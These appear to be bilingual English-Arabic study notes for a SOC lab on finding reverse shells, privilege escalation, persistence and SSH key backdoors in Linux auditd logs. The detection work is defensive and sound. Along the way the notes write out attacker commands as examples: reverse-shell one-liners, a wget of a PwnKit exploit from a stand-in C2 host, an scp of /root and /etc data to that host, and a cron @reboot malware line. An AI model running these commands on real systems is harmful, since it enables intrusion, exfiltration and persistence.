### 1. Attack Convenience (راحة المهاجم)

When a threat actor logs in via **SSH** (Secure Shell), they have a _fully functional terminal_ (طرفية كاملة الصلاحيات). They can use colors, autocomplete, and `Ctrl+C` to stop processes. It feels like they are sitting right in front of the server.

However, when they use an **Exploit** (استغلال) or **Web Vulnerability** (ثغرة في تطبيق الويب), they are _very limited_ (مقيدين جداً). They face many problems:

- **Buggy command output:** The results of their commands look messy (نصوص غير منظمة).
    
- **Timeouts:** The connection is unstable and drops easily.
    
- **Network restrictions:** They can't move freely inside the system.
    

Because of these restrictions, they need a **Reverse Shell**.

---

### 2. What is a Reverse Shell? 
Think of a normal shell as _you_ going to the server. A **Reverse Shell** is different: the server _calls you_ back.

Instead of the attacker connecting to the victim, the attacker forces the **victim (the server)** to connect to the attacker's machine. This creates a stable "session" (جلسة عمل) that is much more convenient.

#### Common methods to establish it:

|**Command**|**Explanation (التفسير)**|
|---|---|
|`bash -i >& /dev/tcp/...`|The victim is forced to connect to the attacker and launch a `bash` terminal.|
|`socat TCP:... EXEC:'bash'`|A powerful tool (أداة متقدمة) that creates a stable connection and gives the attacker a terminal.|
|`python3 -c '...'`|Uses Python code to create the connection and spawn a `bash` shell for the attacker.|

---

### 3. Detecting Reverse Shells (كيفية الكشف)

In a **SOC** (Security Operations Center), a Reverse Shell is treated as a **Critical Alert** (تنبيه حرج). It means the system is _already breached_ (تم اختراق النظام) and the attacker is active.

We use `auditd` logs to find them. The secret is to analyze the **Process Tree** (شجرة العمليات). We don't just look at the command; we look at the _parents_ of the command to find the **Origin** (مصدر الاختراق).

#### The Investigation Logic (خطوات التحقيق):

**Step 1: Search for the suspicious command (البحث عن الأمر المشبوه)**

The attacker used `socat`. We search for it:

`ausearch -i -x socat`

This returns a **PID** (Process ID). Let’s say it is `27808`. This is the _child_ process (العملية الابن).

**Step 2: Find the Parent Process (إيجاد العملية الأب)**

Who started `socat`? We go up the tree:

`ausearch -i --pid 27808`

You will see the process that launched the shell.

**Step 3: Move to the Origin (الوصول للمصدر)**

You keep moving up the tree (نصعد لشجرة العمليات) until you find the source:

`ausearch -i --pid [Previous_PID]`

Eventually, you will see something like `/usr/bin/python3 /opt/trypingme/main.py`. This is the proof: **The Web App was the entry point.**

---

### 4. Listing Reverse Shell Activity (تتبع نشاط المهاجم)

Once the attacker has the shell, they want to do **Discovery** (استكشاف). They will type commands like `id`, `uname -a`, or `ls`.

Because these commands are typed _inside_ the shell, they are "children" of the shell process. To see everything the attacker typed, we use the `ppid` (Parent PID) of the shell:

`ausearch -i --ppid [SHELL_PID] | grep proctitle`

**Why is this important?**

This gives you a clear list of every command the attacker ran. It turns your investigation into a **Timeline of Events** (سلسلة زمنية للأحداث).

---

### Summary Checklist for your VM:

1. **Search:** Use `ausearch -i -x socat` to find the reverse shell execution.
    
2. **Trace:** Use `--pid` to move backward up the "Process Tree".
    
3. **Find Origin:** Repeat until you see the `python` or `web app` process.
    
4. **Audit:** Use `--ppid` on the shell process to list all the commands (like `whoami`, `ls`, etc.) the attacker ran after the breach.






### 1. Privilege Escalation Basics (الأساسيات)

عندما يحصل المهاجم على **Initial Access** عبر ثغرة في تطبيق ويب، غالباً ما يكون مقيداً بـ **Low-privilege service user** (مثل `www-data` أو `serviceuser`). هذا المستخدم "محبوس" داخل مجلدات معينة (مثل `/var/www/html`) ولا يملك صلاحية تشغيل الـ **Malware** أو الوصول لملفات النظام الحساسة.

لذا، المهاجم يحتاج إلى القيام بـ **Privilege Escalation** للانتقال من هذا الـ **User** البسيط إلى الـ **Root User** (صلاحيات المدير).

**أمثلة لعمليات الربط (Linking Discovery to Escalation):**

|**Discovery (ما اكتشفه المهاجم)**|**Privilege Escalation (الاستغلال)**|
|---|---|
|**Old Kernel:** اكتشاف أن الـ **OS** قديم (Unpatched Ubuntu 16.04)|تحميل وتشغيل **Exploit** جاهز مثل **PwnKit** باستخدام `wget`.|
|**SUID Misconfiguration:** العثور على ملف يمتلك **SUID flag**|استغلال هذا الملف لفتح `bash` بصلاحيات الـ **Root**.|
|**Exposed Keys:** العثور على ملف مفاتيح مخزن بالخطأ (`ssh-backup-key`)|استخدام المفتاح للدخول مباشرة كـ **Root** عبر الـ **SSH**.|

---

### 2. The Anatomy of the Attack (تشريح الهجوم)

لكي تكتشف الـ **Privilege Escalation**، يجب أن تراقب الـ **Attack Chain** (سلسلة الهجوم) المكونة من ثلاثة أجزاء رئيسية:

#### أ. A Spike of Discovery Commands (موجة الاستكشاف)

المهاجم لا يقفز للـ **Root** مباشرة. يبدأ بـ **Discovery**:

- تشغيل `whoami` لمعرفة الـ **User ID**.
    
- تشغيل `ps aux` للبحث عن الـ **Security Tools** (مثل Splunk أو EDR).
    
- تشغيل `uname -r` لمعرفة الـ **Kernel version** (للبحث عن ثغرة مناسبة).
    

#### ب. Download and Compile (التحميل والتحويل)

المهاجم يحمل الـ **Exploit** في الـ **Temp Directory** (`/tmp`) لأنه المكان الوحيد المسموح له بالكتابة فيه.

- `wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c`: تحميل الكود.
    
- `gcc /tmp/pwnkit.c -o /tmp/pwnkit`: تحويل الكود لملف تنفيذي (Compilation).
    
- `chmod +x /tmp/pwnkit`: إعطاء صلاحية التنفيذ.
    

#### ج. Data Exfiltration (سرقة البيانات)

بمجرد أن يصبح **Root**، يقوم بـ **Exfiltration** (تسريب البيانات):

- `tar czf dump.tar.gz /root /etc/`: ضغط الملفات الحساسة.
    
- `scp dump.tar.gz attacker@c2-server.thm:~`: إرسال البيانات لسيرفر المهاجم.
    

---

### 3. Detecting Privilege Escalation (كيف نكشفه؟)

بصفتك **SOC Analyst**، لا يجب أن تحفظ كل الـ **Exploits**. السر هو مراقبة الـ **UID** (User ID) في سجلات الـ **Auditd**.

**كيفية التحقيق (The Investigation Workflow):**

**Step 1: البحث عن النشاط المشبوه باستخدام `ausearch`**

ابحث عن الملف التنفيذي الذي تم تشغيله في `/tmp`:

`ausearch -i -x pwnkit`

هنا ستجد أن الـ **PPID** (العملية الأب) هو الـ `serviceuser`.

**Step 2: تتبع الـ Process Tree (شجرة العمليات)**

ابحث عما أطلقه هذا الـ **Process**:

`ausearch -i --ppid [PID_OF_PWNKIT]`

**Step 3: المقارنة (The Smoking Gun)**

هنا لحظة الحقيقة! قارن الـ **UID** (User ID) قبل وبعد تنفيذ الـ **Exploit**:

1. **قبل:** `uid=serviceuser` (المستخدم العادي).
    
2. **بعد:** `uid=root` (المستخدم الخارق).
    

بمجرد أن تجد أن العملية التي أطلقها الـ `serviceuser` قد أنتجت عملية جديدة بـ `uid=root`، فقد تأكدت بنسبة 100% أن الـ **Privilege Escalation** قد نجحت!


### 1. Persistence Concepts (مفاهيم الاستمرارية)

الهدف من الـ **Persistence** هو إنشاء **Backdoor** (باب خلفي) يضمن بقاء المهاجم داخل النظام. في الـ Linux، هناك طريقان رئيسيان يستخدمهما المهاجمون لتحقيق ذلك:

#### A. Cron Persistence (المهام المجدولة)

الـ **Cron** هو الـ **Job Scheduler** (مجدول المهام) في الـ Linux. المهاجمون يحبونه لأنه بسيط جداً.

- **كيف يعمل؟** يقوم المهاجم بإضافة "سطر" واحد في ملفات الـ **Cron** ليتم تنفيذه تلقائياً عند وقت محدد أو عند تشغيل النظام.
    
- **مثال خطير:** الـ **APT29** (مجموعة اختراق عالمية) استخدموا أمر `@reboot` ليضمنوا تشغيل الـ **Malware** الخاص بهم فور إقلاع الجهاز:
    
    Bash
    
    ```
    @reboot nohup /home/<user>/.<hidden>/<malware> > /dev/null 2>&1 &
    ```
    
- **تكتيك الـ Rocke:** يقوم المهاجمون أحياناً بوضع ملف في `/etc/cron.d/root` لضمان أن الـ **Cryptominer** الخاص بهم يتم تحميله كل 10 دقائق (عن طريق `*/10`). إذا قام الـ Admin بحذف ملفاتهم، يتم تحميلها من جديد أوتوماتيكياً!
    

#### B. Systemd Persistence (الخدمات)

هذا هو المستوى الاحترافي للـ **Persistence**. الـ **Systemd** هو المسؤول عن إدارة الـ **Services** (الخدمات) في النظام (مثل الـ DNS أو الـ SSH).

- **كيف يعمل؟** المهاجم ينشئ ملفاً بامتداد `.service` داخل `/etc/systemd/system/`.
    
- **الخدعة:** المهاجم يضع اسماً يبدو موثوقاً (مثل `cloud-online` أو `system-update`) لكي لا يشك فيه الـ Admin. هذا الملف يحتوي على تعليمات تشغيل الـ **Malware** الخاص به كأنها خدمة نظام رسمية.
    

---

### 2. Detecting Persistence (كيفية الكشف)

بما أن المهاجم يحتاج لتعديل ملفات النظام (Cron files أو Systemd files)، فإن الـ **Auditd** هو سلاحك الأقوى للـ **Detection** (الاكتشاف).

#### كيفية المراقبة (Investigation Workflow):

**1. Monitor file changes (مراقبة التعديلات):**

يجب أن تراقب أي تعديلات في المجلدات الحساسة. استخدم هذا الـ **Command** للبحث عن أي تغييرات في ملفات الـ **Systemd**:

Bash

```
ausearch -i -f /etc/systemd/system/
```

- **ماذا تبحث عنه؟** ابحث عن الـ **Syscall** الذي يحمل `O_WRONLY|O_CREAT` (أي إنشاء ملف جديد). إذا رأيت `vi` أو `nano` قام بإنشاء ملف `.service` جديد، فهذه علامة خطر واضحة.
    

**2. Monitor related processes (مراقبة العمليات المرتبطة):**

المهاجم سيضطر لاستخدام أدوات لإدارة هذه الـ **Persistence**. راقب هذه الـ **Commands**:

- `crontab -e`: لتعديل الـ Cron Jobs.
    
- `systemctl start|enable <service>`: لتفعيل الخدمة الخبيثة.
    

**مثال تحقيقي (Forensic Case):**

إذا وجدت في الـ **Logs** التالي:

Bash

```
# proctitle=vi /etc/systemd/system/malicious.service
```

هذا دليل قاطع على وجود محاولة **Persistence**. الـ `vi` (محرر النصوص) لا يجب أن يقوم بإنشاء ملفات في هذا المجلد إلا إذا كان هناك شخص يقوم بـ **Configuration** (إعدادات)، فإذا لم تكن أنت، فهو مهاجم!

---

### 3. Summary for SOC Analyst (ملخص المحلل)

دائماً اسأل نفسك أثناء التحقيق: **"هل هذا التعديل على ملفات النظام طبيعي؟"**

|**الهدف**|**الـ Location (موقع المراقبة)**|**التهديد (Threat)**|
|---|---|---|
|**Cron Jobs**|`/var/spool/cron/*`|تعديلات غير مصرح بها للمهام المجدولة.|
|**Systemd**|`/etc/systemd/system/*`|إنشاء خدمات خبيثة لضمان العمل بعد الـ Reboot.|



### 1. Investigating New User Accounts (كشف الحساب الجديد)

المهاجمون غالباً ما يقومون بإنشاء مستخدم جديد (New User) وإضافته لـ **Group** (مجموعة) تمتلك صلاحيات الـ `sudo` ليتمكنوا من التحكم الكامل لاحقاً.

- **الهدف:** معرفة اسم المستخدم الذي تمت إضافته.
    
- **الطريقة:** سنفحص ملف الـ **Authentication Logs**، وهو السجل الذي يحفظ كل عمليات تسجيل الدخول وإنشاء المستخدمين.
    

**نفذ هذا الأمر في الـ Terminal:**

Bash

```
cat /var/log/auth.log | grep -E 'useradd|usermod'
```

- **كيف تقرأ النتيجة؟**
    
    - ابحث عن سطر يحتوي على `new user: name=...`. الاسم الذي يظهر بعد `name` هو إجابة السؤال الأول.
        
    - تأكد أن هذا السطر تبعه أمر `usermod` الذي أضاف المستخدم لمجموعة `sudo`.
        

---

### 2. Investigating SSH Key Persistence (كشف التلاعب بمفاتيح الـ SSH)

هذه الطريقة (Backdoored SSH Keys) هي المفضلة للمخترقين المحترفين لأنها لا تترك أثراً في سجلات الـ **Login** التقليدية إذا تم الدخول بالمفتاح مباشرة.

- **الهدف:** معرفة الملف الذي تم التلاعب به.
    
- **الطريقة:** سنستخدم `ausearch` للبحث عن أي تغييرات في ملفات الـ `authorized_keys`.
    

**نفذ هذا الأمر في الـ Terminal:**

Bash

```
ausearch -i -f /home/user/.ssh/authorized_keys
```

_(ملاحظة: إذا لم تجد نتائج، جرب المسار `/root/.ssh/authorized_keys` أو المسارات الأخرى المذكورة في الـ Prompt)._

- **كيف تقرأ النتيجة؟**
    
    - ابحث عن سجل (Log entry) يوضح `name=/home/user/.ssh/authorized_keys`.
        
    - ستجد في السجلات (Logs) اسم الملف الذي تم تعديله أو إنشاؤه. هذا المسار الكامل للملف هو إجابة السؤال الثاني.
        

---

### Summary Checklist (ملخص للمحقق)

إذا واجهت صعوبة في استخراج الإجابات، تذكر هذه القاعدة:

| **الهدف (Target)** | **ملف المراقبة (Log File)** | **الأداة (Tool)** |
| ------------------ | --------------------------- | ----------------- |
| **New Users**      | `/var/log/auth.log`         | `grep`            |
| **SSH Backdoors**  | `~/.ssh/authorized_keys`    | `ausearch`        |


**نصيحة تقنية:** عندما تجد الملف الذي تم التغيير عليه، يمكنك دائماً استخدام الأمر `ls -la` في المجلد الخاص به لرؤية تاريخ التعديل (Timestamp). هذا التاريخ يخبرك متى بالضبط "اخترق" المهاجم حساب المستخدم.

جرب تنفيذ هذه الأوامر الآن وأخبرني، هل ظهر لك اسم المستخدم (User) والمسار الكامل للملف (File path)؟ إذا لم يظهر شيء، أخبرني بما يظهر لك في الـ Terminal لأساعدك في "قراءة" المخرجات بشكل صحيح!